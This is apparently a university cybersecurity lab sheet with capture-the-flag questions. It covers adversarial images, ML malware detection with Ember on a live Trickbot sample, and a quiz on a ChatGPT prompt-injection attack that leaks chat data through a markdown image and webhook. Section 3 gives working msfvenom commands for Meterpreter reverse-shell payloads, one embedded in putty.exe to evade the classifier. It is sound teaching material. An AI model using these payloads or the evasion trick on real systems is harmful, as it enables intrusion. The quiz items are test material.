# Lab 10: AI

{% hint style="warning" %}
PLEASE NOTE: This lab image uses a lot of storage space (image size is 2GB, storage size is almost 4GB!), so ensure you have enough space on your hard drive before proceeding.
{% endhint %}

{% hint style="danger" %}
This lab will be using live malware samples. Although the samples we use are not capable of breaking out of docker containers, it is best to minimize the risk by doing this lab within a virtual machine (VM), such as using VirtualBox with Ubuntu or Kali Linux. Please check the [Setting up VM for labs](introduction-to-labs.md#setting-up-virtual-machine-vm-to-do-labs) section. If you are doing the lab directly from your host machine, you should delete the container once you have finished the lab to remove all malware samples - otherwise your antivirus software may not be happy and throw a tantrum. You can automatically delete the container by adding `--rm` flag when running the container.
{% endhint %}

Walkthrough video:

**AI 10-1** [https://www.youtube.com/watch?v=6LhD8jUO1aY](https://www.youtube.com/watch?v=6LhD8jUO1aY)

## 1. Intro to AI and Cybersecurity

Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain.

One area of active research in machine learning is the use of adversarial images. This is where slight changes in the image causes machine learning systems to incorrectly classify objects within the image. So for example, a panda is wrongly recognised as a gibbon. The changes to the image can be imperceptible to a human and so this type of attack could be used to alter a radiological image and change a negative diagnosis of cancer to a positive one in a system that is automatically screening for cancer.

Adversarial attacks could become increasingly common as we come to rely on machine learning systems to automate processes and decisions. This has made the field of research into defences against this type of attack important.

In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach.

To see how this works, we can use a program that uses what is called a non-targeted black box approach to adversarial images. To set it up, follow the instructions below.


{% tabs %}
{% tab title="Windows/Linux" %}
```bash
sudo docker run -it --rm uwacyber/cits1003-labs:ai-image
```
{% endtab %}

{% tab title="Apple Silicon" %}
```bash
sudo docker run -it --rm uwacyber/cits1003-labs:ai-image-arm 
```
{% endtab %}
{% endtabs %}

Also install `matplotlib` inside the container to run the code later:

```
pip3 install matplotlib
```

Once on the docker container, go to the directory `/opt` if not already. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes from a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).

To run the script we do so as follows:

```bash
python3 exploit.py lab_og.jpg
```

```bash
2022-03-02 07:45:46.213378: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN)to use the following CPU instructions in performance-critical operations:  SSE4.1 SSE4.2 AVX AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2022-03-02 07:45:46.221981: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 3599995000 Hz
2022-03-02 07:45:46.223227: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x11a7500 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2022-03-02 07:45:46.223267: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
Downloading data from https://storage.googleapis.com/tensorflow/keras-applications/mobilenet_v2/mobilenet_v2_weights_tf_dim_ordering_tf_kernels_1.0_224.h5
14540800/14536120 [==============================] - 2s 0us/step
Downloading data from https://storage.googleapis.com/download.tensorflow.org/data/imagenet_class_index.json
40960/35363 [==================================] - 0s 2us/step
Processing image: prediction: Labrador_retriever confidence: 41.81848764419556
Saving Input
Processing image: prediction: Labrador_retriever confidence: 41.81848764419556
Saving Epsilon = 0.010
Processing image: prediction: Saluki confidence: 13.087718188762665
Saving Epsilon = 0.100
Processing image: prediction: Weimaraner confidence: 14.94901329278946
Saving Epsilon = 0.150
Processing image: prediction: Weimaraner confidence: 16.2117943167686462118598818779
```

This takes the initial image of `lab_og.jpg` and then creates different versions of the image with the perturbations added. The script tests these images against the neural network and very quickly stops recognising a Labrador and starts recognising other dog types such as the Saluki and Weimaraner, although note that the levels of confidence in that result are very low \~ 16%.

After running the program, you should have some files:

```bash
root@c6d12dab5096:/opt# ls -al
total 736
drwxr-xr-x 1 root root   4096 Mar  2 07:46  .
drwxr-xr-x 1 root root   4096 Mar  2 07:45  ..
-rw-r--r-- 1 root root 135191 Mar  2 07:46 'Epsilon = 0.010.jpg'
-rw-r--r-- 1 root root 175515 Mar  2 07:46 'Epsilon = 0.100.jpg'
-rw-r--r-- 1 root root 200878 Mar  2 07:46 'Epsilon = 0.150.jpg'
-rw-r--r-- 1 root root 134549 Mar  2 07:46  Input.jpg
-rwxr-xr-x 1 root root   3228 Aug  7  2021  exploit.py
-rwxr-xr-x 1 root root  83281 Jul 10  2021  lab_og.jpg
```

Copy these files to your host VM/machine (open up another terminal and use `docker cp` command).

Back on your own machine, these files should be in the directory you specified to share with the docker container. We are now going to test these out on an image recognition program run by Wolfram which is here [https://www.imageidentify.com](https://www.imageidentify.com)

{% hint style="danger" %}
Note the Wolfram site only works intermittently - it isn't reliable. If you can't get it to work, don't worry - just use the predictions that the program `exploit.py` printed out
{% endhint %}

Load the first image, `Input.jpg`, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with `Epsilon = 0.010.jpg` and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image (or misclassify) which has had the most perturbations applied to it.

### Question 1. Enter the wrong dog

Flag: Enter the name of the dog type that `exploit.py` recognises with the "Epsilon = 0.150.jpg" file.

{% hint style="info" %}
Ideally Wolfram should produce the same prediction, but because its model is continuously updating, the prediction may not be the same.&#x20;
{% endhint %}

To a human eye, the dog is still a Labrador albeit a bit fuzzy. Remember that this is not a targeted attack in that we haven't trained the attack using the specific neural network used by the Wolfram site. If we did, we could develop something that would work at much lower levels of disturbance.

Try the same attack but this time using another picture - one of a bear:

![This is a bear](../.gitbook/assets/bear.jpg)

You can right click on this and save it to your share folder and then run the program again. You might see the confidence dropping, but the prediction should still be the same - a brown bear. Obviously not all photos/pictures are well equipped for the perturbations applied using the provided exploit code, but there are many other libraries available that perform better perturbations.

Try with your own images - note that they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.

## 2. Malware recognition with Ember

Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings (as we saw when we used Yara to identify malware). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.

The Elastic Malware Benchmark for Empowering Researchers (Ember) ([https://github.com/elastic/ember](https://github.com/elastic/ember)) is a neural network that uses features extracted from binary files to train a model that can distinguish malware from regular Windows' programs.

To do this, Ember uses a framework called LIEF that will analyse Windows (and other platforms) binaries ([https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)). The data that LIEF produces is then uses a "fingerprint" of the binary and can be used to train the model.

Let's start the docker container to run Ember:

```bash
sudo docker run -it --rm uwacyber/cits1003-labs:ai-malware
```

To test the model `cd` on the same docker container to the directory `/opt/ember`. The model has been pre-trained and so you don't need to do that, although if you are interested, you can (look at the GitHub page).

First, unzip the malware (with the usual password: `infected`):

```bash
unzip malware.zip
```

To test the malware, we can use the following command:

```bash
python3 scripts/classify_binaries.py -m ember_model_2018.txt malware
```

```bash
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
0.99....[hidden]....
```

The script `classify_binary.py` takes the trained model as an argument and the binary file to analyse. As you can see, the sample `malware` is given a >99% probability of being malware.

{% hint style="danger" %}
This \*is\* real malware - do not download to your PC or try and execute
{% endhint %}

The malware is actually _Trickbot_, which is a banking trojan.

We can now try with a normal Windows program `git.exe`

```bash
python3 scripts/classify_binaries.py -m ember_model_2018.txt git.exe
```

```bash
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Unable to find the section associated with CERTIFICATE_TABLE
PGO: UNKNOWN is not implemented yet!
1.7266520173797455e-07
```

What is returned is a \*very\* small number

$$
1.7*10^{-7}
$$

In other words, a practically 0 score for it being malware.

### Question 2. It was malware, probably...

**Flag: Enter the full classification probability for the `malware` you found above**

## 3. Evading the classification Msfvenom and Meterpreter

`Msfvenom` is a utility that comes with what is called an exploitation framework called _Metasploit_. Metasploit is a sophisticated toolset that is used by penetration testers (and hackers) to explore vulnerabilities and exploit them. `Msfvenom` can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a `Meterpreter shell` and normally this is recognised as malware by anti-malware software.

`Msfvenom` comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially machine learning classifiers.

To get started, we are going to run Metasploit. But firstly, we will create a local volume that we can attach to different containers - this is due to the files we are about to create will most likely be filtered automatically by your firewall. So let's create a temporary volume. In your PowerShell/terminal:

```bash
sudo docker volume create volume1
```

This will create a local volume named `volume1`, you can check by `docker volume ls`. Now we can attach this volume instead of host's local drive and share files between containers.

Let's run a Docker container as follows:

```bash
sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
```

This will create a folder called `volume1` in the root directory (you can name this something else e.g., `volume1:/extra`), which is attached to the local volume `volume1`.

Then, we are going to need a file called `putty.exe` that we are going to use as a template for one of the Meterpreter versions. If you have a shared folder between the container and the host, download it by going to the address below and save it to the directory you have shared with the container (you can paste the link in the browser to download, and save it into the shared folder):

```bash
https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
```

Alternatively (e.g., using the shared local volume approach), you can use `wget` to download directly from docker (and move it into the shared folder). You would need to `apt-get update` and `apt-get install wget` on the container.&#x20;

Now, we can run Metasploit by typing:

```bash
msfconsole
```

If you are asked questions, answer yes to the first question (set up a new database) and no to the second (init the web service).

After doing that, you should see something like this (the actual graphic changes each time):

```bash
[!] The following modules could not be loaded!..\
[!] 	/usr/src/metasploit-framework/modules/auxiliary/gather/office365userenum.py
[!] Please see /home/msf/.msf4/logs/framework.log for details.
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.0.53-dev                          ]
+ -- --=[ 2149 exploits - 1142 auxiliary - 366 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

[*] Processing docker/msfconsole.rc for ERB directives.
[*] resource (docker/msfconsole.rc)> Ruby Code (236 bytes)
LHOST => 172.17.0.3
msf6 > 
```

The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :)

We are going to run `msfvenom` from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
-f exe > /volume1/meterpreter1.exe
```

You don't really have to worry about the parameters but if you are interested, the `LHOST` and `LPORT` arguments tell Meterpreter where to connect back to (i.e. our machine). We haven't set up a listener on port 4443 and our executable actually doesn't send back anything, so these values are just there as a space holder. The `-f exe` tells Meterpreter that we are using an executable format for the payload.

Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. I have saved `putty.exe` in the `/volume1` (shared) directory. Run the `msfvenom` command as follows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
-f exe -x /volume1/putty.exe > /volume1/meterpreter2.exe
```

Moreover, `Msfvenom` has other encoders that try and obfuscate the file to avoid detection. One of these is called `shikata ga nai`. You can create a meterpreter binary using the flag:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
-f exe -e x86/shikata_ga_nai > /volume1/meterpreter3.exe
```

Now that we have the three different samples, we can go back to our classifier in the `ai-malware` container and see what happens. Launch the `ai-malware` container with the `volume1` attached (it will be a new container instance of the `ai-malware` image):

```bash
sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai-malware
```

Now, move the meterpreter files into the `/opt/ember` directory. With the first version `meterpreter1.exe` we get:

```bash
root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter1.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Signature PDB_20 is not implemented yet!
0.9999979600610946
```

Definitely malware!

However, when we run the second version, we get:

```bash
root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter2.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
0.00907516308707395
```

So, according to the classifier, this is likely to be a normal, and safe, binary/executable!

And for the last one:

```bash
root@cb69acf0fc22:/opt/ember# python3 scripts/classify_binaries.py -m ember_model_2018.txt meterpreter3.exe
WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
WARNING:   in the feature calculations.
Signature PDB_20 is not implemented yet!
0.9999973876606032
```

Well, this one is still recognised as malware. Obviously, this encoder is not a good fit for the executable we are generating!

It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than with images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that.

{% hint style="danger" %}
Don't forget to delete all malware samples and also delete the local volume you created that contains the meterpreter files.
{% endhint %}

### Question 3. Who is Metasploit?

**Flag: a new user has been added in the Metasploit container with the root privileges. The username is the flag.**

If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there.

## Case study: Prompt injection attacks in AI-based text generation

“In recent years, artificial intelligence has taken huge strides in advancing the field of natural language processing. Among the many breakthroughs in this area, one platform has truly taken the world by storm: ChatGPT. With its sophisticated language model and powerful natural language processing capabilities, ChatGPT has revolutionized the way we think about AI-based text generation. It’s underlying neural network structure is capable of generating text with remarkable accuracy and coherence, utilising a training process that involves processing massive amounts of text data to learn patterns and generate high-quality responses. 
While ChatGPT has certainly made great strides in the field of AI-based text generation, it is not immune to security vulnerabilities. One such vulnerability is prompt injection attacks, which can be used by malicious actors to manipulate the model's behaviour and potentially gain access to sensitive information. Prompt injection attacks are a type of security vulnerability that can occur in natural language processing (NLP) models like ChatGPT. In a prompt injection attack, an attacker crafts a malicious input prompt that can manipulate the model's behaviour in unexpected ways. By injecting specific keywords or phrases into the prompt, the attacker can bias the model's output or even gain access to sensitive data.”

This passage above was generated using ChatGPT! You can try ChatGPT for yourself here! [https://openai.com/blog/chatgpt/](https://openai.com/blog/chatgpt/)


Read through the following article and answer the following questions: [https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2/](https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2/)

### Question 4. The Use of Markdown Image

What is the purpose of the invisible single-pixel markdown image in the prompt injection attack?&#x20;

1. To improve the formatting of ChatGPT responses. &#x20;
2. To track user interactions with the injected prompt. &#x20;
3. To prevent the user from copying the poisoned text. &#x20;
4. To transmit sensitive chat data to the malicious server.

{% hint style="info" %}
Submit the correct option as your flag (e.g., CITS1003{1} if option 1 is the correct answer).
{% endhint %}

### Question 5. The Use of Webhook URL

What is the primary function of the webhook URL in the described attack scenario?&#x20;

1. To serve as a decoy to distract users from the malicious prompt injection. &#x20;
2. To directly inject malicious code into ChatGPT's responses. &#x20;
3. To record and intercept incoming requests, facilitating the transmission of sensitive data to the attacker's server. &#x20;
4. To authenticate users accessing ChatGPT's services. &#x20;

{% hint style="info" %}
Submit the correct option as your flag (e.g., CITS1003{1} if option 1 is the correct answer).
{% endhint %}

### Question 6. The Limitations of The Attack

Which of the following contributes to the limitations of prompt injection attacks against ChatGPT? &#x20;

1. ChatGPT's vulnerability to common web attacks.&#x20;
2. The default temperature parameter of ChatGPT affects the randomness and consistency of its output.&#x20;
3. The lack of user engagement with the injected prompts. &#x20;
4. The dependence on the user's browser.

{% hint style="info" %}
Submit the correct option as your flag (e.g., CITS1003{1} if option 1 is the correct answer).
{% endhint %}
